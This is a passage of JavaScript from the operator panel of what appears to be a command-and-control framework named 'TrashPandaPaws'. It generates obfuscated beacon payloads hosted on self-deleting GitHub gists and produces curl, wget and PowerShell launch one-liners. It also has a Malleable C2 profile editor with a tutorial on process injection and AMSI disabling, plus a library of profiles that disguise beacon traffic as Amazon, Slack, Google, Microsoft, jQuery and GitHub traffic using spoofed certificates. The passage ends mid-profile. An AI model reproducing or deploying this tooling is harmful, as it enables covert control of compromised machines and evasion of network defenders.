  const interval = document.getElementById("bg-interval")?.value || "300";
  const jitter = document.getElementById("bg-jitter")?.value || "20";
  const layers = document.getElementById("bg-layers")?.value || "3";
  const filename = document.getElementById("bg-gist-fn")?.value?.trim() || "update.py";
  const btn = document.querySelector(".ave-run");
  if(btn){ btn.disabled=true; btn.textContent="Creating Gist..."; }
  try{
    const data = await api("/api/server/beacon-gist", {
      method:"POST",
      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers, filename})
    });
    if(data.error){ toast("err","Beacon Gist",data.error,5000); return; }
    const container = document.getElementById("bg-result");
    if(!container) return;
    container.innerHTML =
      '<div class="bgen-result">'
      +'<div class="bgen-tab-bar">'
      +'<button class="bgen-tab active" onclick="bgenTab(this,\'unix\')">curl (Linux/macOS)</button>'
      +'<button class="bgen-tab" onclick="bgenTab(this,\'wget\')">wget</button>'
      +'<button class="bgen-tab" onclick="bgenTab(this,\'win\')">PowerShell</button>'
      +'</div>'
      +'<div class="bgen-code" id="bg-code">'+esc(data.oneliner_unix)+'</div>'
      +'<div class="bgen-meta" id="bg-meta">'
      +'<span>\u{1F510} '+data.layers+' layers</span>'
      +'<span>\u{1F4E6} '+Math.round(data.size/1024)+' KB</span>'
      +'<span style="color:var(--green)">\u{2702}️ auto-delete on connect</span>'
      +'</div>'
      +'<div style="display:flex;gap:6px;align-self:flex-end">'
      +'<button class="bgen-copy" onclick="bgenCopy()">\u{1F4CB} Copy</button>'
      +'<button class="bgen-copy" style="color:var(--orange);border-color:rgba(255,170,0,0.3)" onclick="bgenDeleteGist(\''+data.gist_id+'\')">\u{1F5D1}️ Delete Gist</button>'
      +'</div>'
      +'<div style="font-size:10px;color:var(--text2);padding:4px 0">Gist: <a href="'+esc(data.gist_url)+'" target="_blank" style="color:var(--blue)">'+esc(data.gist_id)+'</a> &middot; File: '+esc(data.filename)+'</div>'
      +'</div>';
    container._unix = data.oneliner_unix;
    container._win = data.oneliner_win;
    container._wget = data.oneliner_wget;
    toast("ok","Beacon Gist","Private gist created. Will auto-delete when agent connects.",5000);
  }catch(e){
    toast("err","Beacon Gist","Failed: "+e.message,4000);
  }finally{
    if(btn){ btn.disabled=false; btn.textContent="\u{1F680} Generate Payload"; }
  }
}

async function bgenDeleteGist(gistId){
  if(!confirm("Delete gist "+gistId+"?")) return;
  try{
    const data = await api("/api/server/beacon-gist/"+gistId, {method:"DELETE"});
    if(data.error){ toast("err","Gist",data.error,4000); return; }
    toast("ok","Gist","Gist "+gistId+" deleted",3000);
    const container = document.getElementById("bg-result");
    if(container) container.innerHTML = '<div style="text-align:center;padding:16px;color:var(--text2);font-size:12px">Gist deleted.</div>';
  }catch(e){
    toast("err","Gist","Delete failed: "+e.message,4000);
  }
}

function bgenTab(el, platform){
  el.parentElement.querySelectorAll(".bgen-tab").forEach(t=>t.classList.remove("active"));
  el.classList.add("active");
  const container = document.getElementById("bg-result");
  const code = document.getElementById("bg-code");
  const deob = document.getElementById("bg-deob");
  const meta = document.getElementById("bg-meta");
  if(!container || !code) return;
  if(platform==="deob" && deob){
    code.style.display="none";
    meta.style.display="none";
    deob.style.display="block";
    if(!deob.innerHTML){
      const layers = container._deob || [];
      let html = '<div class="bgen-deob-chain">';
      layers.forEach((l,i) => {
        const isRaw = l.layer === 0;
        const isOpen = isRaw;
        const desc = isRaw
          ? 'Python beacon source with embedded C2 configuration'
          : 'zlib.compress (level 9) + base64.b64encode + randomized import alias';
        html += '<div class="bgen-deob-step'+(isRaw?' raw':'')+(isOpen?' open':'')+'" onclick="bgenAccordion(this)">'
          +'<div class="bgen-deob-hdr">'
          +'<span class="bgen-deob-badge">'+(isRaw?'Original':'Layer '+l.layer)+'</span>'
          +'<div class="bgen-deob-right">'
          +'<span class="bgen-deob-size">'+Math.round(l.size/1024)+' KB</span>'
          +'<span class="bgen-deob-chevron">&#9654;</span>'
          +'</div></div>'
          +'<div class="bgen-deob-body">'
          +'<div class="bgen-deob-desc">'+desc+'</div>'
          +'<div class="bgen-code" style="color:'+(isRaw?'var(--green)':'var(--text)')+'">'+esc(l.preview)+(l.size>2000?'\n\n[... truncated ...]':'')+'</div>'
          +'</div></div>';
      });
      html += '</div>';
      deob.innerHTML = html;
    }
  }else{
    code.style.display="block";
    if(meta) meta.style.display="flex";
    if(deob) deob.style.display="none";
    code.textContent = platform==="win" ? container._win : platform==="wget" ? (container._wget||container._unix) : container._unix;
  }
}

async function bgenCopy(){
  const code = document.getElementById("bg-code");
  if(!code) return;
  try{
    await navigator.clipboard.writeText(code.textContent);
    toast("ok","Beacon Gen","Copied to clipboard",2000);
  }catch(e){
    const range = document.createRange();
    range.selectNodeContents(code);
    const sel = window.getSelection();
    sel.removeAllRanges(); sel.addRange(range);
    document.execCommand("copy");
    toast("ok","Beacon Gen","Copied to clipboard",2000);
  }
}

function bgenAccordion(el){
  const wasOpen = el.classList.contains("open");
  el.parentElement.querySelectorAll(".bgen-deob-step").forEach(s => s.classList.remove("open"));
  if(!wasOpen) el.classList.add("open");
}

// ── C2 Malleable Profile Editor ──

let _c2ProfileSource = "";

const C2PE_DEFAULT = `# Malleable C2 Profile — TrashPandaPaws
# Customize beacon traffic to blend with legitimate services

set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";

https-certificate {
    set CN   "*.azurewebsites.net";
    set O    "Microsoft Corporation";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/api/v2/telemetry /api/v2/events /collect";

    client {
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Language" "en-US,en;q=0.9";

        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store";
        header "X-Request-Id" "trace-aef2b";

        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v2/submit /api/v2/report";

    client {
        header "Content-Type" "application/json";
        header "X-Correlation-Id" "req-78fd3";

        id {
            base64url;
            parameter "sid";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            mask;
            base64;
            print;
        }
    }
}
`;

function c2peHighlight(code){
  const lines = code.split("\n");
  return lines.map(line => {
    if(line.trimStart().startsWith("#"))
      return '<span class="c2pe-hl-comment">'+esc(line)+'</span>';
    let out = "";
    let i = 0;
    while(i < line.length){
      if(line[i] === '"'){
        let j = i+1;
        while(j < line.length && line[j] !== '"'){ if(line[j]==='\\') j++; j++; }
        if(j < line.length) j++;
        out += '<span class="c2pe-hl-string">'+esc(line.slice(i,j))+'</span>';
        i = j;
      } else if(line[i] === '#'){
        out += '<span class="c2pe-hl-comment">'+esc(line.slice(i))+'</span>';
        break;
      } else {
        let j = i;
        while(j < line.length && line[j] !== '"' && line[j] !== '#') j++;
        let chunk = line.slice(i,j);
        chunk = chunk.replace(/\b(http-get|http-post|http-stager|https-certificate|http-config|stage|process-inject|post-ex)\b/g,
          '<span class="c2pe-hl-block">$1</span>');
        chunk = chunk.replace(/\b(client|server|metadata|id|output|transform-x86|transform-x64|execute)\b/g,
          '<span class="c2pe-hl-block">$1</span>');
        chunk = chunk.replace(/\b(set|header|parameter)\b/g,
          '<span class="c2pe-hl-keyword">$1</span>');
        chunk = chunk.replace(/\b(base64url|base64|mask|netbios|netbiosu)\b/g,
          '<span class="c2pe-hl-transform">$1</span>');
        chunk = chunk.replace(/\b(prepend|append|print|uri-append|strrep|string|stringw)\b/g,
          '<span class="c2pe-hl-directive">$1</span>');
        out += chunk;
        i = j;
      }
    }
    return out;
  }).join("\n");
}

function c2peUpdateLines(ta, linesEl){
  const n = ta.value.split("\n").length;
  let h = "";
  for(let i=1;i<=n;i++) h+=i+"\n";
  linesEl.textContent = h;
}

function c2peSyncScroll(ta, pre, linesEl){
  pre.scrollTop = ta.scrollTop;
  pre.scrollLeft = ta.scrollLeft;
  linesEl.scrollTop = ta.scrollTop;
}

function showC2ProfileEditor(){
  const overlay = document.createElement("div");
  overlay.className = "c2pe-overlay";
  overlay.onclick = e => { if(e.target===overlay){ _c2ProfileSource = overlay.querySelector("textarea")?.value || ""; overlay.remove(); }};

  const tutorial = `
<div class="c2pe-tut-section open">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Overview <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <p>A <b>Malleable C2 Profile</b> defines how beacon traffic looks on the wire. It controls HTTP headers, URIs, encoding, and timing to make C2 traffic blend in with legitimate services.</p>
    <h4>Basic Syntax</h4>
    <pre># Comments start with #
set sleeptime "60000";   # Values in double quotes
set jitter    "20";      # Semicolons required

http-get {               # Block definitions
    client { ... }       # Nested blocks
    server { ... }
}</pre>
    <p><b>Rules:</b> All strings must use double quotes. Every statement ends with <code>;</code>. Blocks use <code>{ }</code>.</p>
  </div>
</div>
<div class="c2pe-tut-section">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Global Options <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <table>
      <tr><th>Option</th><th>Description</th></tr>
      <tr><td><code>sleeptime</code></td><td>Callback interval in ms (e.g. "60000" = 60s)</td></tr>
      <tr><td><code>jitter</code></td><td>% randomization (0-99)</td></tr>
      <tr><td><code>useragent</code></td><td>HTTP User-Agent string</td></tr>
      <tr><td><code>dns_idle</code></td><td>IP for "no tasks" via DNS</td></tr>
      <tr><td><code>maxdns</code></td><td>Max DNS hostname length</td></tr>
      <tr><td><code>host_stage</code></td><td>Host payload for staging ("true"/"false")</td></tr>
      <tr><td><code>pipename</code></td><td>Named pipe for SMB beacons</td></tr>
      <tr><td><code>headers_remove</code></td><td>Comma-separated headers to strip</td></tr>
    </table>
  </div>
</div>
<div class="c2pe-tut-section">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">http-get / http-post <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <p>Define how beacon check-in (GET) and output submission (POST) look.</p>
    <pre>http-get {
    set uri "/api/v2/collect /updates";
    client {
        header "Accept" "application/json";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        output {
            mask;
            base64;
            print;
        }
    }
}</pre>
    <h4>Required Structure</h4>
    <p><code>http-get</code> client must contain a <code>metadata { }</code> block.<br>
    <code>http-post</code> client must contain <code>id { }</code> and <code>output { }</code> blocks.<br>
    Both need <code>client { }</code> and <code>server { }</code>.</p>
  </div>
</div>
<div class="c2pe-tut-section">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Data Transforms <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <p>Transform blocks encode data for transport. Applied top-to-bottom.</p>
    <table>
      <tr><th>Transform</th><th>Effect</th></tr>
      <tr><td><code>base64</code></td><td>Base64 encode</td></tr>
      <tr><td><code>base64url</code></td><td>URL-safe base64</td></tr>
      <tr><td><code>mask</code></td><td>XOR with random key</td></tr>
      <tr><td><code>netbios</code></td><td>NetBIOS encode (lowercase)</td></tr>
      <tr><td><code>netbiosu</code></td><td>NetBIOS encode (uppercase)</td></tr>
      <tr><td><code>prepend</code></td><td>Prepend a string</td></tr>
      <tr><td><code>append</code></td><td>Append a string</td></tr>
    </table>
    <h4>Termination (required)</h4>
    <p>Every transform block must end with exactly one:</p>
    <table>
      <tr><td><code>print;</code></td><td>Data goes in HTTP body</td></tr>
      <tr><td><code>header "Name";</code></td><td>Data stored in a header</td></tr>
      <tr><td><code>parameter "Name";</code></td><td>Data in URL parameter</td></tr>
      <tr><td><code>uri-append;</code></td><td>Append to URI path</td></tr>
    </table>
  </div>
</div>
<div class="c2pe-tut-section">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">https-certificate <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <p>Configure the TLS certificate for HTTPS listeners.</p>
    <pre>https-certificate {
    set CN "*.example.com";
    set O  "Example Inc.";
    set C  "US";
    set validity "365";
}</pre>
    <p>Options: <code>C</code>, <code>CN</code>, <code>O</code>, <code>OU</code>, <code>L</code>, <code>ST</code>, <code>validity</code>, <code>keystore</code>, <code>password</code></p>
  </div>
</div>
<div class="c2pe-tut-section">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">stage / process-inject / post-ex <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <h4>stage { }</h4>
    <p>Controls Beacon DLL loading. Key options: <code>allocator</code>, <code>cleanup</code>, <code>obfuscate</code>, <code>sleep_mask</code>, <code>stomppe</code>, <code>userwx</code>, <code>smartinject</code>.</p>
    <pre>stage {
    set cleanup "true";
    set obfuscate "true";
    set sleep_mask "true";
    set userwx "false";
    transform-x86 {
        prepend "\\x90\\x90\\x90";
    }
}</pre>
    <h4>process-inject { }</h4>
    <p>Controls injection: <code>allocator</code> (VirtualAllocEx/NtMapViewOfSection), <code>min_alloc</code>, <code>startrwx</code>, <code>userwx</code>.</p>
    <h4>post-ex { }</h4>
    <p>Post-exploitation: <code>spawnto_x86</code>, <code>spawnto_x64</code>, <code>amsi_disable</code>, <code>keylogger</code>.</p>
  </div>
</div>
<div class="c2pe-tut-section">
  <div class="c2pe-tut-hdr" onclick="c2peTutToggle(this)">Example Profiles <span class="chevron">&#9654;</span></div>
  <div class="c2pe-tut-body">
    <p>Community profiles that mimic real services:</p>
    <table>
      <tr><th>Profile</th><th>Mimics</th></tr>
      <tr><td>amazon.profile</td><td>Amazon web traffic</td></tr>
      <tr><td>gmail.profile</td><td>Gmail API calls</td></tr>
      <tr><td>slack.profile</td><td>Slack API traffic</td></tr>
      <tr><td>office365_calendar</td><td>O365 calendar sync</td></tr>
      <tr><td>jquery-c2.4.2</td><td>jQuery CDN requests</td></tr>
      <tr><td>safebrowsing</td><td>Google Safe Browsing</td></tr>
    </table>
    <p style="margin-top:8px"><a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles" target="_blank" style="color:var(--blue)">Browse community profiles on GitHub &#8599;</a></p>
  </div>
</div>`;

  overlay.innerHTML = `
<div class="c2pe-panel">
  <button class="c2pe-close" onclick="_c2ProfileSource=this.closest('.c2pe-panel').querySelector('textarea').value;this.closest('.c2pe-overlay').remove()">&#10005;</button>
  <div class="c2pe-topbar">
    <h2>&#128737; Malleable C2 Profile Editor</h2>
    <button class="c2pe-lint-btn" onclick="c2peLint()">&#9889; Lint</button>
    <button onclick="c2peSaveProfile()" style="border-color:rgba(77,170,87,0.5);color:var(--green)">&#128190; Save &amp; Apply</button>
    <button onclick="c2pePushProfile()" style="border-color:rgba(255,26,26,0.4);color:var(--red)">&#128225; Push to Agents</button>
    <button onclick="showBurpImport()">&#128270; Import from Burp</button>
    <button onclick="showC2Library()">&#128218; Library</button>
    <button onclick="c2peLoadDefault()">&#128196; Template</button>
    <button onclick="c2peClear()">&#128465; Clear</button>
  </div>
  <div class="c2pe-body">
    <div class="c2pe-editor-wrap">
      <div class="c2pe-edit-container">
        <div class="c2pe-lines" id="c2pe-lines"></div>
        <pre id="c2pe-highlight"></pre>
        <textarea id="c2pe-textarea" spellcheck="false" placeholder="Paste or write your Malleable C2 profile here..."></textarea>
      </div>
      <div class="c2pe-lint-bar" id="c2pe-lint-bar"></div>
    </div>
    <div class="c2pe-sidebar">${tutorial}</div>
  </div>
</div>`;

  document.body.appendChild(overlay);

  const ta = document.getElementById("c2pe-textarea");
  const pre = document.getElementById("c2pe-highlight");
  const linesEl = document.getElementById("c2pe-lines");

  ta.value = _c2ProfileSource || "";
  function update(){
    pre.innerHTML = c2peHighlight(ta.value);
    c2peUpdateLines(ta, linesEl);
  }
  ta.addEventListener("input", update);
  ta.addEventListener("scroll", () => c2peSyncScroll(ta, pre, linesEl));
  ta.addEventListener("keydown", e => {
    if(e.key === "Tab"){
      e.preventDefault();
      const s = ta.selectionStart, en = ta.selectionEnd;
      ta.value = ta.value.substring(0,s)+"    "+ta.value.substring(en);
      ta.selectionStart = ta.selectionEnd = s+4;
      update();
    }
  });
  update();
  if(!_c2ProfileSource){
    api("/api/server/c2-profile/active").then(d => {
      if(d.source && d.source.trim()){
        _c2ProfileSource = d.source;
        ta.value = d.source;
        update();
      } else {
        c2peLoadDefault();
      }
    }).catch(() => c2peLoadDefault());
  }
}

function c2peLoadDefault(){
  const ta = document.getElementById("c2pe-textarea");
  if(!ta) return;
  ta.value = C2PE_DEFAULT;
  _c2ProfileSource = C2PE_DEFAULT;
  ta.dispatchEvent(new Event("input"));
}

function c2peClear(){
  const ta = document.getElementById("c2pe-textarea");
  if(!ta) return;
  ta.value = "";
  _c2ProfileSource = "";
  ta.dispatchEvent(new Event("input"));
  document.getElementById("c2pe-lint-bar").innerHTML = "";
}

async function c2peSaveProfile(){
  const ta = document.getElementById("c2pe-textarea");
  if(!ta || !ta.value.trim()){ toast("warn","C2 Profile","Editor is empty",3000); return; }
  _c2ProfileSource = ta.value;
  try{
    const data = await api("/api/server/c2-profile/save", {
      method:"POST",
      body:JSON.stringify({source: ta.value})
    });
    if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
    const cfg = data.config || {};
    let msg = "Profile saved";
    if(cfg.useragent) msg += " — UA set";
    const nGet = (cfg.http_get?.uris||[]).length;
    const nPost = (cfg.http_post?.uris||[]).length;
    if(nGet||nPost) msg += ` — ${nGet} GET, ${nPost} POST URIs`;
    toast("ok","C2 Profile",msg,4000);
  }catch(e){
    toast("err","C2 Profile","Save failed: "+e.message,4000);
  }
}

async function c2pePushProfile(){
  try{
    const check = await api("/api/server/c2-profile/active");
    if(!check.active){
      toast("warn","C2 Profile","No saved profile — click Save & Apply first",4000);
      return;
    }
    const data = await api("/api/server/c2-profile/push", {
      method:"POST",
      body:JSON.stringify({})
    });
    if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
    toast("ok","C2 Profile","Profile pushed to "+data.count+" agent(s)",4000);
  }catch(e){
    toast("err","C2 Profile","Push failed: "+e.message,4000);
  }
}

async function c2peLint(){
  const ta = document.getElementById("c2pe-textarea");
  const bar = document.getElementById("c2pe-lint-bar");
  if(!ta || !bar) return;
  _c2ProfileSource = ta.value;
  try{
    const data = await api("/api/server/c2-profile/lint", {
      method:"POST",
      body: JSON.stringify({source: ta.value})
    });
    const all = [...(data.errors||[]),...(data.warnings||[]),...(data.info||[])];
    if(all.length === 0){
      bar.innerHTML = '<div class="c2pe-lint-summary" style="color:var(--green)">&#10003; Profile is valid — no issues found ('+data.line_count+' lines)</div>';
      toast("ok","C2 Profile","Profile is valid",3000);
      return;
    }
    const ec = (data.errors||[]).length, wc = (data.warnings||[]).length, ic = (data.info||[]).length;
    let html = '<div class="c2pe-lint-summary">';
    if(ec) html += '<span style="color:var(--red)">'+ec+' error'+(ec>1?'s':'')+'</span> ';
    if(wc) html += '<span style="color:var(--orange)">'+wc+' warning'+(wc>1?'s':'')+'</span> ';
    if(ic) html += '<span style="color:var(--blue)">'+ic+' info</span>';
    html += '</div>';
    all.forEach(item => {
      const sev = item.severity || "info";
      html += '<div class="c2pe-lint-item" onclick="c2peGotoLine('+item.line+')">'
        +'<span class="line">L'+item.line+'</span>'
        +'<span class="sev-'+sev+'">'+sev+'</span>'
        +'<span class="msg">'+esc(item.msg)+'</span>'
        +'</div>';
    });
    bar.innerHTML = html;
    if(ec) toast("err","C2 Profile",ec+" error(s) found",3000);
    else toast("ok","C2 Profile","Profile checked — "+wc+" warning(s)",3000);
  }catch(e){
    toast("err","C2 Profile","Lint failed: "+e.message,4000);
  }
}

function c2peGotoLine(n){
  const ta = document.getElementById("c2pe-textarea");
  if(!ta) return;
  const lines = ta.value.split("\n");
  let pos = 0;
  for(let i=0;i<Math.min(n-1,lines.length);i++) pos += lines[i].length+1;
  ta.focus();
  ta.setSelectionRange(pos, pos + (lines[n-1]||"").length);
  const lineHeight = 19.2;
  ta.scrollTop = Math.max(0, (n-5)*lineHeight);
}

function c2peTutToggle(el){
  const sec = el.closest(".c2pe-tut-section");
  if(!sec) return;
  const wasOpen = sec.classList.contains("open");
  sec.parentElement.querySelectorAll(".c2pe-tut-section").forEach(s => s.classList.remove("open"));
  if(!wasOpen) sec.classList.add("open");
}

const C2PE_LIBRARY = [
{name:"Amazon CDN",icon:"\u{1F4E6}",desc:"Mimics Amazon CloudFront CDN traffic with typical e-commerce headers and cookie-based metadata.",tags:[["cdn","t-cdn"],["ecommerce","t-web"]],source:`# Amazon CloudFront CDN Profile
set sleeptime "45000";
set jitter    "35";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
set host_stage "false";

https-certificate {
    set CN   "d1234abcdef.cloudfront.net";
    set O    "Amazon";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/images/shop /assets/product /content/media";

    client {
        header "Accept" "image/webp,image/apng,image/*,*/*;q=0.8";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Referer" "https://www.amazon.com/";
        header "X-Amz-Cf-Id" "xQ3hR7vN9kpL2mW8jY1";

        metadata {
            base64url;
            prepend "session-id=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "max-age=31536000";
        header "X-Cache" "Hit from cloudfront";
        header "Via" "1.1 d1234abcdef.cloudfront.net (CloudFront)";

        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/cart/update /api/wishlist/sync";

    client {
        header "Content-Type" "application/json";
        header "X-Amz-RequestId" "SGBV4T5A2R1K3N8Q";

        id {
            base64url;
            parameter "ref";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "X-Amz-Cf-Pop" "FRA56-P4";

        output {
            mask;
            base64;
            print;
        }
    }
}
`},
{name:"Slack Webhook",icon:"\u{1F4AC}",desc:"Emulates Slack API webhook and event subscription traffic patterns.",tags:[["saas","t-saas"],["api","t-api"]],source:`# Slack API Profile
set sleeptime "30000";
set jitter    "40";
set useragent "Slackbot 1.0 (+https://api.slack.com/robots)";
set host_stage "false";

https-certificate {
    set CN   "hooks.slack.com";
    set O    "Slack Technologies";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/api/conversations.history /api/channels.info /api/users.list";

    client {
        header "Accept" "application/json";
        header "Accept-Charset" "utf-8";

        metadata {
            base64url;
            prepend "xoxb-";
            header "Authorization";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-Slack-Req-Id" "a1b2c3d4-e5f6-7890";
        header "Strict-Transport-Security" "max-age=31536000";

        output {
            mask;
            base64;
            prepend "{\\"ok\\":true,\\"messages\\":[{\\"text\\":\\"";
            append "\\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/api/chat.postMessage /api/files.upload";

    client {
        header "Content-Type" "application/json; charset=utf-8";

        id {
            base64url;
            parameter "channel";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";

        output {
            mask;
            base64;
            prepend "{\\"ok\\":true,\\"ts\\":\\"";
            append "\\"}";
            print;
        }
    }
}
`},
{name:"Google APIs",icon:"\u{1F50D}",desc:"Blends with Google Analytics and Fonts API traffic. Uses measurement protocol URIs.",tags:[["cdn","t-cdn"],["api","t-api"]],source:`# Google Analytics / APIs Profile
set sleeptime "50000";
set jitter    "25";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
set host_stage "false";

https-certificate {
    set CN   "www.google-analytics.com";
    set O    "Google LLC";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/collect /g/collect /analytics.js";

    client {
        header "Accept" "*/*";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Referer" "https://www.google.com/";

        parameter "v" "2";
        parameter "tid" "G-AB12CD34EF";
        parameter "cid" "1234567890.9876543210";

        metadata {
            base64url;
            parameter "_p";
        }
    }

    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        header "X-Content-Type-Options" "nosniff";

        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/batch /j/collect";

    client {
        header "Content-Type" "application/x-www-form-urlencoded";

        id {
            netbios;
            parameter "gtm";
        }

        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "text/plain";
        header "Access-Control-Allow-Origin" "*";

        output {
            mask;
            base64;
            print;
        }
    }
}
`},
{name:"OneDrive Sync",icon:"\u{2601}",desc:"Mimics Microsoft OneDrive file sync and delta API patterns with Azure certificate.",tags:[["saas","t-saas"],["cdn","t-cdn"]],source:`# Microsoft OneDrive Sync Profile
set sleeptime "55000";
set jitter    "30";
set useragent "Microsoft SkyDriveSync 24.125.0623.0001 ship; Windows NT 10.0 (22631)";
set host_stage "false";

https-certificate {
    set CN   "onedrive.live.com";
    set O    "Microsoft Corporation";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/v1.0/me/drive/root/delta /v1.0/me/drive/recent /v1.0/me/drive/sharedWithMe";

    client {
        header "Accept" "application/json";
        header "X-RequestStats" "SDK-Version=Graph-dotnet-2.0";

        metadata {
            base64url;
            prepend "Bearer ";
            header "Authorization";
        }
    }

    server {
        header "Content-Type" "application/json; odata.metadata=minimal";
        header "request-id" "c9a7b3e1-f2d4-4a6c-8e0b-1d3f5a7c9e2b";
        header "x-ms-ags-diagnostic" "{\\"ServerInfo\\":{\\"DataCenter\\":\\"West Europe\\"}}";

        output {
            mask;
            base64;
            prepend "{\\"@odata.context\\":\\"https://graph.microsoft.com/v1.0/$metadata#Collection(driveItem)\\",\\"value\\":[{\\"name\\":\\"";
            append "\\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/v1.0/me/drive/items/upload /v1.0/me/drive/root/children";

    client {
        header "Content-Type" "application/json";
        header "X-ClientCorrelationId" "4e7f2a1b-3d8c-9e0f-6b5a";

        id {
            base64url;
            header "X-RequestId";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            mask;
            base64;
            prepend "{\\"id\\":\\"";
            append "\\",\\"status\\":\\"uploaded\\"}";
            print;
        }
    }
}
`},
{name:"jQuery CDN",icon:"\u{1F4DC}",desc:"Classic CDN evasion profile disguised as jQuery and static asset requests. Widely used baseline.",tags:[["cdn","t-cdn"],["web","t-web"]],source:`# jQuery / Static Asset CDN Profile
set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
set host_stage "false";

http-get {
    set uri "/jquery-3.7.1.min.js /jquery-3.7.1.slim.min.js /jquery.min.map";

    client {
        header "Accept" "*/*";
        header "Accept-Encoding" "gzip, deflate";
        header "Referer" "https://code.jquery.com/";

        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "public, max-age=31536000";
        header "X-Content-Type-Options" "nosniff";
        header "Access-Control-Allow-Origin" "*";

        output {
            mask;
            base64;
            prepend "/*! jQuery v3.7.1 | (c) OpenJS Foundation | jquery.org/license */\\n!function(e,t){\\"use strict\\";";
            append "\\n}(window);";
            print;
        }
    }
}

http-post {
    set uri "/npm/jquery@3.7.1 /ajax/libs/jquery/3.7.1/jquery.min.js";

    client {
        header "Content-Type" "application/octet-stream";
        header "Origin" "https://cdnjs.cloudflare.com";

        id {
            base64url;
            parameter "v";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/javascript";

        output {
            mask;
            base64;
            print;
        }
    }
}
`},
{name:"GitHub API",icon:"\u{1F419}",desc:"Disguises traffic as GitHub REST API calls for repository and gist operations.",tags:[["api","t-api"],["saas","t-saas"]],source:`# GitHub REST API Profile
set sleeptime "40000";
set jitter    "30";
set useragent "GitHub-Hookshot/v1";
set host_stage "false";

https-certificate {
    set CN   "api.github.com";
    set O    "GitHub, Inc.";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/repos/notifications /gists /user/repos";

    client {
        header "Accept" "application/vnd.github+json";
        header "X-GitHub-Api-Version" "2022-11-28";

        metadata {
            base64url;
            prepend "ghp_";
            header "Authorization";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-RateLimit-Limit" "5000";
        header "X-RateLimit-Remaining" "4987";
        header "X-GitHub-Request-Id" "E4A2:1C3B:5F6D:7E8A:9B0C";

        output {
            mask;
            base64;
            prepend "[{\\"id\\":";
            append ",\\"node_id\\":\\"MDQ6R2lzdA\\"}]";
            print;
        }
    }
}

http-post {
    set uri "/gists /repos/issues/comments";

    client {
        header "Content-Type" "application/json";
        header "Accept" "application/vnd.github+json";

        id {
            base64url;
            header "X-GitHub-Delivery";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";

        output {
            mask;
            base64;
            prepend "{\\"id\\":\\"";
            append "\\",\\"created_at\\":\\"2025-01-01T00:00:00Z\\"}";
            print;
        }
    }
}
`},
{name:"Outlook / O365",icon:"\u{1F4E7}",desc:"Emulates Microsoft Outlook Web and Exchange Online REST API traffic with OAuth tokens.",tags:[["saas","t-saas"],["api","t-api"]],source:`# Microsoft Outlook / Office 365 Profile
set sleeptime "35000";
set jitter    "25";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0";
set host_stage "false";

https-certificate {
    set CN   "outlook.office365.com";
    set O    "Microsoft Corporation";
